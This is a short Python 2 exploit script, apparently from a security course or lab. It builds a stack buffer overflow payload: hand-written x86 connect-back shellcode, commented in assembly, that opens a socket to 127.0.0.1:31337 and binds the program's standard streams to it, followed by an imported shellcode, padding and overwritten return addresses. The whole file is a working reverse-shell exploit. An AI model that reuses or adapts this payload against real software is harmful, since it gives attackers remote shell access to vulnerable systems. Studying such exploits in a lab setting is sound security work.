from shellcode import shellcode
from struct import pack
'''
# prepare the stack
push    %ebp
mov     %esp,%ebp
sub     $64,%esp

# parameters for socket(2)
xor     %eax,%eax
mov     $2,%al
mov     %al,-12(%ebp) # AF_INET
xor     %eax,%eax
mov     $1,%al
mov     %al,-8(%ebp) # SOCK_STREAM
xor     %eax,%eax
mov     %eax,-4(%ebp) # IPPROTO_IP

# invoke socketcall for socket(2)
xor     %eax,%eax
mov     $0x66,%al # socketcall

xor     %ebx,%ebx
mov     $1,%bl # socket
lea     -12(%ebp),%ecx # address of parameter array
int     $0x80

# save socket file descriptor
mov     %eax,%edi

# parameters for connect(3)
xor     %eax,%eax
mov     $2,%al
mov     %al,-12(%ebp) # AF_INET
mov     $-16777344,%eax
not     %eax
mov     %eax,-8(%ebp) # host: 127.0.0.1 (16777343)
mov     $0x697a,%ax
mov     %ax,-10(%ebp) # port: 31337 (27002)

mov     %edi,-24(%ebp) # sockfd
lea     -12(%ebp),%eax
mov     %eax,-20(%ebp) # &sockaddr
xor     %eax,%eax
mov     $0x10,%al
mov     %eax,-16(%ebp) # addrlen

# invoke socketcall for connect(3)
xor     %eax,%eax
mov     $0x66,%al # socketcall
xor     %ebx,%ebx
mov     $3,%bl # connect
lea     -24(%ebp),%ecx # address of parameter array
int     $0x80

# redirect stdin/stdout/stderr
xor     %eax,%eax
mov     $0x3f,%al # sys_dup2
mov     %edi,%ebx # sockfd
xor     %ecx,%ecx # stdin
int     $0x80

xor     %eax,%eax
mov     $0x3f,%al # sys_dup2
mov     %edi,%ebx # sockfd
xor     %ecx,%ecx
mov     $1,%cl # stdout
int     $0x80

xor     %eax,%eax
mov     $0x3f,%al # sys_dup2
mov     %edi,%ebx #sockfd
xor     %ecx,%ecx
mov     $2,%cl # stderr
int     $0x80
'''
callbackshell = "\x55\x89\xe5\x83\xec\x40" + \
"\x31\xc0\xb0\x02\x88\x45\xf4" + \
"\x31\xc0\xb0\x01\x88\x45\xf8" + \
"\x31\xc0\x89\x45\xfc" + \
"\x31\xc0\xb0\x66" + \
"\x31\xdb\xb3\x01" + \
"\x8d\x4d\xf4\xcd\x80\x89\xc7" + \
"\x31\xc0\xb0\x02\x88\x45\xf4" + \
"\xb8\x80\xff\xff\xfe\xf7\xd0\x89\x45\xf8" + \
"\x66\xb8\x7a\x69\x66\x89\x45\xf6" + \
"\x89\x7d\xe8\x8d\x45\xf4\x89\x45\xec" + \
"\x31\xc0\xb0\x10\x89\x45\xf0" + \
"\x31\xc0\xb0\x66" + \
"\x31\xdb\xb3\x03" + \
"\x8d\x4d\xe8\xcd\x80" + \
"\x31\xc0\xb0\x3f" + \
"\x89\xfb\x31\xc9\xcd\x80" + \
"\x31\xc0\xb0\x3f" + \
"\x89\xfb\x31\xc9\xb1\x01\xcd\x80" + \
"\x31\xc0\xb0\x3f" + \
"\x89\xfb\x31\xc9\xb1\x02\xcd\x80"
print callbackshell + shellcode + "a" * (2048 - len(callbackshell) - 23) + pack("<I", 0xbffe94b8) + pack("<I", 0xbffe9ccc)
